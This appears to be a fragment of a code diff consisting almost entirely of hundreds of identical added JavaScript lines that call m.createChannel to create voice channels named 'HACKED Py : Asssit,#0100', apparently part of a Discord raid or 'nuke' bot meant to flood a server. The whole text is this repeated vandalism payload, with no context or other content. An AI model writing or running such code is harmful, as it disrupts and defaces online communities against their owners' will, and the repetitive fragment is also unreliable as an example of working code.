+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
